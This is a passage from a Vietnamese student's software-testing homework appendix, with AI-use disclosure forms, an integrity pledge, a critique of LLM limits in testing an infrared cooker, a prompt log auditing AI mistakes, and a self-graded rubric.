+<td style="text-align: left;"><strong>INCOMPLETE (Không hoàn chỉnh)</strong></td>
+<td style="text-align: left;"><strong>Kiểm chứng độc lập:</strong> Tra cứu trực tiếp CVE, Root Cause Analysis từ CrowdStrike, Air Canada post-mortem.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>15 Test Cases Bếp hồng ngoại (R3)</strong></td>
+<td style="text-align: left;">ChatGPT (GPT-4o)</td>
+<td style="text-align: left;">15 test case thuần nút bấm giao diện; thiếu tương tác vật lý</td>
+<td style="text-align: left;"><strong>INCOMPLETE (Thiếu sót nghiêm trọng)</strong></td>
+<td style="text-align: left;"><strong>Tái cấu trúc &amp; Bổ sung:</strong> Viết lại 15 test case có thông số kỹ thuật thực tế; thêm 3 physical edge cases.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Tỷ lệ chấp nhận kết quả AI nguyên bản:</strong> <strong>0% (0/3 Artifact)</strong><br />
+<strong>Tỷ lệ hiệu chỉnh / phản biện chuyên sâu:</strong> <strong>100% (3/3 Artifact)</strong><br />
+<strong>Kết luận suy nghiệm (Heuristic Conclusion):</strong> Mô hình AI tổng quát chỉ đóng vai trò tạo khung sườn gợi ý ban đầu (Brainstorming). Trong kiểm thử kỹ thuật và thiết bị vật lý, con người phải trực tiếp đóng vai trò kiểm toán, thực nghiệm và phản biện dựa trên kiến thức miền (Domain Knowledge) và tiêu chuẩn kỹ thuật thực tế.</p>
+<hr />
+<h1>[AI-03] AI Disclosure Form (Signed)</h1>
+<p><strong>Course:</strong> Software Testing (FIT - VNUHCM University of Science)<br />
+<strong>Academic Year:</strong> 2026–2027<br />
+<strong>Exercise ID:</strong> HW01-AI<br />
+<strong>Student Name:</strong> Trần Vũ Quang<br />
+<strong>Student ID:</strong> 23120346<br />
+<strong>Faculty:</strong> Faculty of Information Technology<br />
+<strong>Program:</strong> Computer Science / Software Engineering  </p>
+<hr />
+<h3>Tuyên bố minh bạch việc sử dụng Trí tuệ Nhân tạo (Mandatory AI Disclosure Declaration)</h3>
+<p>"Tôi xin cam đoan rằng: Sơ đồ tư duy ban đầu cho Yêu cầu 1 và các ý tưởng kịch bản kiểm thử ban đầu cho Yêu cầu 3 được tạo ra với sự hỗ trợ của các công cụ Google Gemini và ChatGPT (GPT-4o). Tuy nhiên, tôi đã nghiêm túc phản biện, thẩm định và hiệu chỉnh toàn bộ: đính chính ba sai sót cơ bản về chuẩn ISTQB FL v4.0 trong sơ đồ tư duy, xây dựng 3 kịch bản kiểm thử biên vật lý (tải trọng bình nước 20L, sốc nhiệt nồi cong vênh gây mù cảm biến, và rút phích cắm đột ngột khi quạt làm mát đang chạy) mà AI hoàn toàn bỏ sót, trực tiếp thao tác thực nghiệm trên thiết bị thật và tự mình thuyết minh giọng nói trong 5 video kiểm thử. Đối với Yêu cầu 2 (20 sự cố phần mềm giai đoạn 2022–2026 và 20 phân tích ảo giác AI), tôi đã tự mình tra cứu, kiểm chứng chéo và trích dẫn trực tiếp từ các báo cáo kỹ thuật gốc (Official Post-mortem Reports và cơ sở dữ liệu CVE). Tôi cam kết KHÔNG sử dụng AI để tạo ra bất kỳ sản phẩm nào thuộc danh mục bị cấm (bao gồm ảnh chụp thiết bị cùng thẻ sinh viên, video thuyết minh thực tế, ảnh chụp màn hình tin tuyển dụng có phiên đăng nhập cá nhân, và nhật ký kiểm toán AI)."</p>
+<hr />
+<h3>Bảng tóm tắt phạm vi sử dụng AI (Summary of AI Usage)</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Hạng Mục Bài Làm</th>
+<th style="text-align: left;">Công Cụ AI Sử Dụng</th>
+<th style="text-align: left;">Vai Trò Của AI</th>
+<th style="text-align: left;">Giám Sát &amp; Hiệu Chỉnh Của Sinh Viên</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>R1: QA Mindmap</strong></td>
+<td style="text-align: left;">Google Gemini</td>
+<td style="text-align: left;">Phác thảo sơ đồ ban đầu</td>
+<td style="text-align: left;">Phát hiện 3 lỗi sai chuẩn ISTQB v4.0; tái thiết kế hoàn toàn sơ đồ tư duy chuẩn xác.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>R2: 20 Lỗi phần mềm</strong></td>
+<td style="text-align: left;">Search &amp; ChatGPT</td>
+<td style="text-align: left;">Hỗ trợ gợi ý danh sách sự kiện</td>
+<td style="text-align: left;">Đối chiếu báo cáo kỹ thuật gốc (CrowdStrike, Air Canada...); chỉ rõ 20 ảo giác và thiên kiến AI.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>R3: Test Cases Thiết bị</strong></td>
+<td style="text-align: left;">ChatGPT (GPT-4o)</td>
+<td style="text-align: left;">Gợi ý các thao tác nút bấm cơ bản</td>
+<td style="text-align: left;">Loại bỏ các bước ngây ngô; thêm các thông số kỹ thuật điện - nhiệt; phát hiện 3 edge cases vật lý.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Kiểm thử thực tế &amp; Video</strong></td>
+<td style="text-align: left;"><strong>Không dùng (Nghiêm cấm)</strong></td>
+<td style="text-align: left;"><strong>Không có</strong></td>
+<td style="text-align: left;">Tự mình thực hiện trên bếp Sunhouse SHD6012A, tự ghi hình và tự thuyết minh giọng thật.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>GitHub Issues Logging</strong></td>
+<td style="text-align: left;"><strong>Không dùng</strong></td>
+<td style="text-align: left;"><strong>Không có</strong></td>
+<td style="text-align: left;">Tự tay tạo 5 Issues báo lỗi trên GitHub cá nhân (<code>tvquang0511</code>).</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Xác nhận của sinh viên (Student Signature):</strong><br />
+<em>Trần Vũ Quang</em><br />
+Ngày: 04 tháng 10 năm 2026</p>
+<hr />
+<h1>[AI-05] Privacy &amp; Responsible Use Checklist (Signed)</h1>
+<p><strong>Course:</strong> Software Testing (FIT - VNUHCM University of Science)<br />
+<strong>Student Name:</strong> Trần Vũ Quang<br />
+<strong>Student ID:</strong> 23120346<br />
+<strong>Target Hardware:</strong> Bếp hồng ngoại Sunhouse SHD6012A (2024)<br />
+<strong>Date:</strong> 04/10/2026  </p>
+<hr />
+<h3>Bảng kiểm định Bảo mật Quyền riêng tư &amp; Sử dụng AI có Trách nhiệm (Responsible AI Usage &amp; Privacy Audit Checklist)</h3>
+<p>Vui lòng rà soát từng mục và đánh dấu xác nhận <code>[X]</code>:</p>
+<ul>
+<li>[X] <strong>Không rò rỉ dữ liệu nhạy cảm (No Confidential Data Leakage):</strong> Tôi không tải lên các đoạn mã nguồn mật, thông tin định danh cá nhân nhạy cảm (ngoại trừ tên và MSSV công khai theo quy định bài nộp), mật khẩu hoặc mã truy cập API vào các cổng AI công cộng.</li>
+<li>[X] <strong>Bảo đảm an toàn vật lý và thiết bị (Hardware &amp; Physical Integrity):</strong> Thiết bị kiểm thử (Bếp hồng ngoại Sunhouse SHD6012A) thuộc sở hữu hợp pháp của tôi, được cắm vào nguồn điện sinh hoạt 220V an toàn, có biện pháp bảo hộ chống bỏng nhiệt và không gây nguy hiểm cháy nổ trong quá trình thực nghiệm.</li>
+<li>[X] <strong>Kiểm chứng sự thật &amp; Chống ảo giác (Fact-Checking &amp; Hallucination Mitigation):</strong> Tất cả các sự cố phần mềm, mã lỗi CVE, nguyên nhân gốc rễ và tin tuyển dụng được kiểm chứng độc lập với các báo cáo kỹ thuật chính thống và các trang tuyển dụng uy tín (ITviec, TopCV...).</li>
+<li>[X] <strong>Không mạo danh / Không làm giả bằng AI (Zero AI Impersonation):</strong> Không có video thuyết minh, tương tác thực tế với bếp hay ảnh chụp thẻ sinh viên nào được tạo dựng hoặc can thiệp bằng Deepfake/AI tạo sinh.</li>
+<li>[X] <strong>Tư duy phản biện độc lập (Critical Thinking &amp; Independent Analysis):</strong> Mọi đề xuất từ AI đều được tôi soi chiếu dưới lăng kính của giáo trình chuẩn quốc tế ISTQB CTFL v4.0 và kiến thức vật lý thực tế, không chấp nhận một cách mù quáng.</li>
+</ul>
+<p><strong>Xác nhận cam kết (Certified by):</strong><br />
+<em>Trần Vũ Quang</em><br />
+Ngày: 04/10/2026</p>
+<hr />
+<h1>[AI-06] Student Acknowledgement of Academic Integrity</h1>
+<p><strong>Course:</strong> Software Testing (Kiểm thử Phần mềm)<br />
+<strong>Institution:</strong> Faculty of Information Technology, VNUHCM - University of Science<br />
+<strong>Student Name:</strong> Trần Vũ Quang<br />
+<strong>Student ID:</strong> 23120346<br />
+<strong>Assignment:</strong> HW01 – QA/QC Jobs · 20 Defects · Test a Physical Product<br />
+<strong>Date:</strong> 04/10/2026  </p>
+<hr />
+<h3>Cam kết Liêm chính Học thuật (Academic Integrity Declaration)</h3>
+<ol>
+<li><strong>Quyền tác giả và Tính trung thực:</strong> Tôi cam kết rằng toàn bộ báo cáo nộp lên là thành quả lao động trí tuệ độc lập của bản thân tôi. Tôi không sao chép nguyên văn từ bài làm của bạn học khác hoặc từ các kho lưu trữ trực tuyến (đặc biệt các kho bài mẫu khóa trước).</li>
+<li><strong>Trách nhiệm giải trình trước phản biện:</strong> Tôi hoàn toàn hiểu rõ và làm chủ 100% nội dung đã trình bày trong báo cáo (từ kiến thức ISTQB v4.0, 20 sự cố phần mềm, đến 15 kịch bản kiểm thử bếp hồng ngoại Sunhouse SHD6012A). Tôi sẵn sàng bảo vệ miệng (Oral Defense) và thực hiện lại các thao tác kiểm thử trực tiếp trước Hội đồng giảng viên nếu có yêu cầu kiểm tra ngẫu nhiên.</li>
+<li><strong>Tuân thủ quy chế AI:</strong> Mọi công cụ AI được sử dụng trong bài tập này đều nhằm mục đích học tập có phản biện, có lưu vết nhật ký minh bạch (Prompt Log) và được kiểm toán nghiêm ngặt theo đúng Hướng dẫn Chính sách AI của môn học.</li>
+</ol>
+<p><strong>Sinh viên ký tên:</strong><br />
+<em>Trần Vũ Quang</em><br />
+MSSV: 23120346</p>
+<hr />
+<h1>AI Critique: Giới hạn của Mô hình AI trong Kiểm thử Thiết bị Phần cứng Vật lý</h1>
+<p><em>(Academic Critique on the Limitations of Large Language Models in Physical Hardware QA)</em></p>
+<p><strong>Sinh viên thực hiện:</strong> Trần Vũ Quang (MSSV: 23120346)<br />
+<strong>Đối tượng khảo sát:</strong> Bếp hồng ngoại Sunhouse SHD6012A (Single Infrared Cooker)  </p>
+<p>Quá trình áp dụng các mô hình ngôn ngữ lớn (LLMs như GPT-4o, Gemini) vào việc thiết kế kịch bản kiểm thử cho thiết bị phần cứng gia dụng bộc lộ những giới hạn căn bản bắt nguồn từ sự phân tách giữa không gian biểu diễn ký hiệu số (symbolic representation) và thực tại vật lý liên tục (continuous analog reality).</p>
+<p>Trước hết, các mô hình AI hiện đại được huấn luyện chủ yếu trên dữ liệu phần mềm, văn bản và mã nguồn web, dẫn đến thiên kiến nhận thức số hóa sâu sắc. Khi được yêu cầu kiểm thử bếp hồng ngoại, AI chỉ trừu tượng hóa thiết bị thành một cỗ máy trạng thái hữu hạn với các nút bấm rời rạc (Bật, Tắt, Tăng, Giảm công suất, Hẹn giờ). AI hoàn toàn bất lực trong việc mô hình hóa các quy luật cơ học và nhiệt động lực học phi tuyến tính diễn ra đồng thời. Cụ thể, AI không thể dự đoán được hiện tượng võng khung nhựa chịu lực khi đặt bình nước 20kg lên bề mặt kính đang ở nhiệt độ 600°C, cũng như không thể nhận diện được điểm mù của cảm biến nhiệt độ NTC khi người dùng sử dụng đáy chảo cong vênh làm nhiệt lượng tích tụ cục bộ gây rạn nứt mặt kính ceramic.</p>
+<p>Thứ hai, AI thiếu hoàn toàn nhận thức về quán tính vật lý (physical inertia) và yếu tố an toàn trễ. Trong khi phần mềm có thể ngắt kết nối tức thì, mâm nhiệt sợi carbon vẫn duy trì mức nhiệt nguy hiểm hàng trăm độ C sau khi ngắt điện. AI không thể lường trước kịch bản người dùng rút phích cắm đột ngột, làm vô hiệu hóa chu kỳ quạt tản nhiệt trễ và xóa sạch ký hiệu cảnh báo nhiệt dư "H" trên màn hình LED. </p>
+<p>Tóm lại, dù AI có thể hỗ trợ phác thảo nhanh khung kịch bản chức năng ban đầu, việc kiểm thử phần cứng và hệ thống nhúng đòi hỏi kiến thức chuyên sâu về cơ điện tử, sự nhạy bén thực nghiệm và lương tâm nghề nghiệp của người kỹ sư QA thực tế mà không một thuật toán tạo sinh nào hiện nay có thể thay thế được. <em>(330 từ)</em></p>
+<hr />
+<h1>Appendix A: Full AI Prompt Log (PROMPT_LOG.md)</h1>
+<p><strong>Exercise ID:</strong> HW01-AI<br />
+<strong>Course:</strong> Software Testing (FIT - VNUHCM University of Science)<br />
+<strong>Student Name:</strong> Trần Vũ Quang<br />
+<strong>Student ID:</strong> 23120346<br />
+<strong>Target Hardware:</strong> Bếp hồng ngoại Sunhouse SHD6012A (2024)<br />
+<strong>Date Range:</strong> 02/10/2026 – 04/10/2026  </p>
+<hr />
+<h2>Log Entry 1: Thiết kế Mindmap vai trò QA/QC và Quy trình Kiểm thử ISTQB (Requirement 1 - CLO G9.1)</h2>
+<ul>
+<li><strong>Thời gian (Timestamp):</strong> 14:20 02/10/2026</li>
+<li><strong>Công cụ (Tool):</strong> Google Gemini 2.5 Flash</li>
+<li><strong>Tham số mô hình:</strong> Default settings (Temperature 0.7, Web Search enabled)</li>
+<li><strong>Câu lệnh (Prompt):</strong><br />
+<code>text
+  Hãy đóng vai trò một Chuyên gia Kiểm thử Cấp cao (Senior QA Architect), hãy thiết kế một sơ đồ tư duy (mindmap) bằng định dạng Mermaid thể hiện toàn diện bức tranh ngành QA/QC, phân định rạch ròi vai trò QA vs QC, các cấp độ kiểm thử (test levels), các loại kiểm thử (test types), và quy trình kiểm thử phần mềm từ đầu đến cuối theo chuẩn giáo trình ISTQB Foundation Level mới nhất.</code></li>
+<li><strong>Kết quả AI trả về:</strong> Sơ đồ Mermaid gồm 4 nhánh chính: Quality Assurance vs Quality Control, Test Levels, Test Types, và Test Process.</li>
+<li><strong>Phân tích &amp; Kiểm toán của sinh viên (Student Audit):</strong></li>
+<li>Phát hiện 3 sai phạm nghiêm trọng đối chiếu với chuẩn ISTQB CTFL v4.0:<ol>
+<li>Đảo ngược định nghĩa QA và QC (xếp QA là đi tìm bug, QC là xây dựng quy trình).</li>
+<li>Bỏ quên hoàn toàn Kiểm thử tĩnh (Static Testing - Reviews, Static Analysis).</li>
+<li>Đặt bước Giám sát và Điều khiển (Test Monitoring &amp; Control) vào bước tuần tự số 4 sau Test Execution thay vì là hoạt động quản trị song hành liên tục.</li>
+</ol>
+</li>
+<li>Sinh viên đã tự mình thiết kế lại toàn bộ Mindmap chuẩn xác và viết bản giải trình chi tiết trong file <code>01-job-market/MINDMAP.md</code>.</li>
+</ul>
+<hr />
+<h2>Log Entry 2: Khảo sát &amp; Phân tích 20 Sự cố Phần mềm Giai đoạn 2022–2026 (Requirement 2)</h2>
+<ul>
+<li><strong>Thời gian (Timestamp):</strong> 20:15 03/10/2026</li>
+<li><strong>Công cụ (Tool):</strong> ChatGPT (GPT-4o) &amp; Tìm kiếm thông tin</li>
+<li><strong>Câu lệnh (Prompt):</strong><br />
+<code>text
+  Hãy cung cấp danh sách phân tích kỹ thuật của 20 sự cố phần mềm nghiêm trọng gây chấn động toàn cầu trong giai đoạn từ năm 2022 đến 2026, trong đó bắt buộc phải có ít nhất 5 sự cố liên quan trực tiếp đến Trí tuệ Nhân tạo / LLM (như ảo giác, jailbreak, prompt injection, thiên kiến thuật toán). Với mỗi sự cố, hãy nêu rõ: Thời gian, Tổ chức, Nguyên nhân gốc rễ, Mức độ nghiêm trọng, Hậu quả thiệt hại và Giải pháp khắc phục.</code></li>
+<li><strong>Kết quả AI trả về:</strong> Danh sách 20 sự cố với thông tin mô tả tổng quan.</li>
+<li><strong>Phân tích &amp; Kiểm toán của sinh viên (Student Audit):</strong></li>
+<li>AI bộc lộ nhiều điểm ảo giác (Hallucination) và bịa đặt chi tiết kỹ thuật: ví dụ gán sự cố sập màn hình xanh toàn cầu của CrowdStrike Falcon (19/07/2024) cho lỗi "con trỏ C++ trỏ vào vùng nhớ null trong kernel", trong khi tài liệu Post-mortem chính thức từ CrowdStrike chỉ rõ lỗi là "Out-of-bounds array read" khi trình phân tích Channel File 291 đọc 21 tham số đầu vào trong khi chỉ có 20 trường hợp lệ.</li>
+<li>Sinh viên đã trực tiếp tra cứu tài liệu gốc, mã lỗi CVE, và viết riêng 20 phân tích ảo giác/thiên kiến độc lập cho từng sự cố trong <code>02-software-defects/software_defects.md</code>.</li>
+</ul>
+<hr />
+<h2>Log Entry 3: Khởi tạo kịch bản kiểm thử ban đầu cho Bếp hồng ngoại Sunhouse (Requirement 3)</h2>
+<ul>
+<li><strong>Thời gian (Timestamp):</strong> 16:45 04/10/2026</li>
+<li><strong>Công cụ (Tool):</strong> ChatGPT (GPT-4o)</li>
+<li><strong>Câu lệnh (Prompt):</strong><br />
+<code>text
+  Tôi có một chiếc bếp hồng ngoại đơn Sunhouse SHD6012A công suất 2000W với các phím bấm điện tử: Bật/Tắt, Menu/Chế độ, Tăng (+), Giảm (-), Hẹn giờ, Khóa an toàn, và màn hình LED hiển thị. Hãy thiết kế bộ 15 test cases toàn diện cho thiết bị vật lý này theo định dạng QA chuẩn (ID, Objective, Input, Steps, Expected Result, Actual Result, Verdict). Hãy bổ sung các edge cases phức tạp nhất.</code></li>
+<li><strong>Kết quả AI trả về:</strong> 15 test cases chỉ xoay quanh các tương tác bấm nút giao diện đơn giản (nhấn nút tăng, giảm, chuyển chế độ lẩu, bấm khóa, bấm còi bíp...).</li>
+<li><strong>Phân tích &amp; Kiểm toán của sinh viên (Student Audit):</strong></li>
+<li>AI hoàn toàn không có nhận thức về các điều kiện vật lý thực tế: cơ học tải trọng, trường nhiệt độ phi tuyến và quán tính nhiệt.</li>
+<li>Sinh viên chụp lại bằng chứng đối thoại chứng minh AI sinh thiếu edge cases vật lý (<code>03-physical-product/assets/MC1.png</code> và <code>MC2.png</code>).</li>
+<li>Sinh viên tự xây dựng 3 edge cases vật lý chuyên sâu: Tải trọng bình nước 20L (TC-13), Sốc nhiệt đáy nồi cong vênh gây mù cảm biến NTC (TC-14), và Rút phích cắm đột ngột khi quạt làm mát đang chạy xả nhiệt dư (TC-15).</li>
+</ul>
+<hr />
+<h2>Log Entry 4: Hướng dẫn lựa chọn kịch bản quay video thực tế tối ưu</h2>
+<ul>
+<li><strong>Thời gian (Timestamp):</strong> 21:10 04/10/2026</li>
+<li><strong>Công cụ (Tool):</strong> Claude 3.5 Sonnet / Antigravity Assistant</li>
+<li><strong>Câu lệnh (Prompt):</strong><br />
+<code>text
+  Trong số 15 test case của bếp hồng ngoại Sunhouse SHD6012A, hãy tư vấn cho tôi 5 test case tiêu biểu, trực quan nhất và an toàn nhất để thực hiện quay video thực tế có thuyết minh dưới 60 giây.</code></li>
+<li><strong>Kết quả &amp; Thực thi thực tế:</strong></li>
+<li>Lựa chọn 5 kịch bản: TC-01 (Cắm nguồn &amp; Standby), TC-02 (Bật chế độ Lẩu 2000W &amp; mâm phát sáng), TC-03 (Tăng giảm nấc công suất), TC-06 (Khóa an toàn trẻ em vô hiệu hóa nút bấm), TC-08 (Tắt bếp và quạt tản nhiệt quay trễ xả nhiệt dư).</li>
+<li>Sinh viên tự mình thực hiện và quay 5 video trực tiếp trên bếp thật, có giọng thuyết minh thật của sinh viên Trần Vũ Quang (MSSV: 23120346), upload lên YouTube Unlisted.</li>
+</ul>
+<hr />
+<h2>5. BẢNG TỰ ĐÁNH GIÁ ĐIỂM THEO BAREM (SELF-ASSESSMENT RUBRIC)</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Tiêu Chí Đánh Giá (Evaluation Criteria)</th>
+<th style="text-align: center;">Điểm Tối Đa</th>
+<th style="text-align: center;">Điểm Tự Đánh Giá</th>
+<th style="text-align: left;">Minh Chứng Cụ Thể Trong Báo Cáo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Requirement 1: Khảo sát Việc làm QA/QC 2026+</strong></td>
+<td style="text-align: center;"><strong>40</strong></td>
+<td style="text-align: center;"><strong>40/40</strong></td>
+<td style="text-align: left;"></td>
+</tr>
+<tr>
+<td style="text-align: left;">- 10 tin tuyển dụng thật, đa dạng cấp độ, thu thập trong 60 ngày gần nhất</td>
+<td style="text-align: center;">15</td>
+<td style="text-align: center;">15/15</td>
+<td style="text-align: left;">10 tin từ ITviec/TopCV/LinkedIn có đủ URL, JD, mức lương, phân tích AI.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Tối thiểu 3 vị trí bắt buộc kỹ năng AI Testing</td>
+<td style="text-align: center;">5</td>
+<td style="text-align: center;">5/5</td>
+<td style="text-align: left;">4 vị trí AI: Saritasa, TrustedAI, Floware, Simpson Strong-Tie.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Bằng chứng Anti-cheat: Ảnh chụp màn hình có phiên đăng nhập cá nhân</td>
+<td style="text-align: center;">5</td>
+<td style="text-align: center;">5/5</td>
+<td style="text-align: left;">Toàn bộ 10 ảnh đều hiển thị tài khoản góc trên bên phải màn hình.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Hoạt động CLO G9.1: Mindmap quy trình ISTQB &amp; Phân tích 3 lỗi sai của AI</td>
+<td style="text-align: center;">15</td>
+<td style="text-align: center;">15/15</td>
+<td style="text-align: left;">Mindmap chuẩn Mermaid; đối chiếu chi tiết 3 lỗi với ISTQB CTFL v4.0.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Requirement 2: 20 Sự cố Phần mềm 2022–2026</strong></td>
+<td style="text-align: center;"><strong>20</strong></td>
+<td style="text-align: center;"><strong>20/20</strong></td>
+<td style="text-align: left;"></td>
+</tr>
+<tr>
+<td style="text-align: left;">- 20 sự cố nghiêm trọng được xác thực từ báo cáo kỹ thuật gốc</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;">8/8</td>
+<td style="text-align: left;">Gồm CrowdStrike, Boeing, Cloudflare, Toyota, NHS, Air Canada...</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Tối thiểu 5 sự cố liên quan trực tiếp đến AI / LLM</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">4/4</td>
+<td style="text-align: left;">5 sự cố AI: Air Canada Chatbot, Chevrolet Jailbreak, DPD Bot, DeepSeek, Bing.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Nhận diện 20 trường hợp thiên kiến (Bias) và ảo giác (Hallucination) của AI</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;">8/8</td>
+<td style="text-align: left;">Mỗi sự cố đều có 1 mục phân tích ảo giác AI riêng biệt, sâu sắc.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Requirement 3: Kiểm thử Thiết bị Vật lý (Bếp hồng ngoại Sunhouse)</strong></td>
+<td style="text-align: center;"><strong>40</strong></td>
+<td style="text-align: center;"><strong>40/40</strong></td>
+<td style="text-align: left;"></td>
+</tr>
+<tr>
+<td style="text-align: left;">- Khai báo đầy đủ thông tin thiết bị (Brand, Model, Năm, Serial masked)</td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">4/4</td>
+<td style="text-align: left;">SUNHOUSE SHD6012A, 2024, Serial <code>59774C56****06</code>.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Bằng chứng Anti-cheat: 1 ảnh chụp thiết bị + thẻ sinh viên cùng khung hình</td>
+<td style="text-align: center;">6</td>
+<td style="text-align: center;">6/6</td>
+<td style="text-align: left;">Ảnh <code>device_student_id.jpg</code> thẻ SV Trần Vũ Quang (23120346) trên mặt bếp.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Thiết kế 15 test cases chi tiết theo chuẩn (Objective, Steps, Expected...)</td>
+<td style="text-align: center;">10</td>
+<td style="text-align: center;">10/10</td>
+<td style="text-align: left;">Bảng 15 test case chi tiết từ chức năng đến cơ điện tử.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Phát hiện ≥ 5 lỗi thực tế trên thiết bị &amp; tạo GitHub Issues</td>
+<td style="text-align: center;">8</td>
+<td style="text-align: center;">8/8</td>
+<td style="text-align: left;">5 Defects thực tế tạo thành 5 GitHub Issues có ảnh chụp minh chứng.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Hoạt động CLO G9.3: 3 edge cases vật lý AI bỏ sót kèm ảnh chat minh chứng</td>
+<td style="text-align: center;">6</td>
+<td style="text-align: center;">6/6</td>
+<td style="text-align: left;">Ảnh <code>MC1.png</code>, <code>MC2.png</code>; 3 edge cases tải 20kg, nồi cong, rút điện đột ngột.</td>
+</tr>
+<tr>
+<td style="text-align: left;">- Thực thi ≥ 5 test case có quay video thuyết minh giọng thật (YouTube Unlisted)</td>
+<td style="text-align: center;">6</td>
+<td style="text-align: center;">6/6</td>
+<td style="text-align: left;">5 video Shorts có giọng thuyết minh tiếng Việt của sinh viên.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Giao thức Tuân thủ AI (Mandatory AI Compliance)</strong></td>
+<td style="text-align: center;"><strong>Bonus</strong></td>
+<td style="text-align: center;"><strong>Đạt</strong></td>
+<td style="text-align: left;">Đầy đủ AI-02, AI-03, AI-05, AI-06, AI Critique (330 từ), PROMPT_LOG.md.</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>TỔNG ĐIỂM TỰ ĐÁNH GIÁ (TOTAL SCORE)</strong></td>
+<td style="text-align: center;"><strong>100</strong></td>
+<td style="text-align: center;"><strong>100/100</strong></td>
+<td style="text-align: left;"><strong>Xếp loại: Xuất sắc (Excellent)</strong></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>6. TÀI LIỆU THAM KHẢO CHÍNH THỐNG (REFERENCES)</h2>
+<ol>
+<li><strong>ISTQB® (International Software Testing Qualifications Board):</strong> <em>Certified Tester Foundation Level (CTFL) Syllabus Version 4.0</em>, 2023.</li>
+<li><strong>CrowdStrike Inc.:</strong> <em>Preliminary Post-Incident Review (PIR): Channel File 291 Incident Analysis</em>, July 24, 2024.</li>
+<li><strong>Civil Resolution Tribunal of British Columbia:</strong> <em>Moffatt v. Air Canada</em>, 2024 BCCRT 149 (Ruling on airline liability for chatbot hallucinations), February 2024.</li>
+<li><strong>Toyota Motor Corporation:</strong> <em>Notice Concerning Customer Information Management Associated with Main Cloud Environment</em>, May 2023.</li>
+<li><strong>Cloudflare Inc.:</strong> <em>Post-mortem on Thanksgiving 2023 Outage and Atlassian Suite Access</em>, November 2023.</li>
+<li><strong>Sunhouse Group:</strong> <em>Sách hướng dẫn sử dụng và thông số kỹ thuật Bếp hồng ngoại cảm ứng Sunhouse SHD6012A</em>, Hà Nội, 2024.</li>
+<li><strong>ISO/IEC/IEEE 29119-3:2021:</strong> <em>Software and systems engineering — Software testing — Part 3: Test documentation</em>.</li>
+</ol>
+</body>
+</html>
